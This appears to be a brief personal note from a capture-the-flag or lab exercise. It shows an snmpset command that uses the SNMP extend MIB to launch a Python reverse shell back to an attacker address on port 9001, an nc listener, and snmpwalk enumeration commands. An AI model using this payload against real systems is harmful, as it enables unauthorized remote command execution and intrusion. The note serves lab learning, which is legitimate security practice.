
attempting reverse shell payload from hacktricks
https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce
~~~
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.241.165 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.47\",9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
~~~

setup nc listener
~~~
nc -lvnp 9001
~~~

revshell payload failed

Enum SNMP:

snmpwalk

~~~
snmpwalk -v 2c -c public 10.10.10.251
~~~

![](antique-snmp-enum-1.png)

~~~
snmpwalk -v 2c -c public 10.129.241.165 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
~~~

![](antique-snmp-enum-2.png)

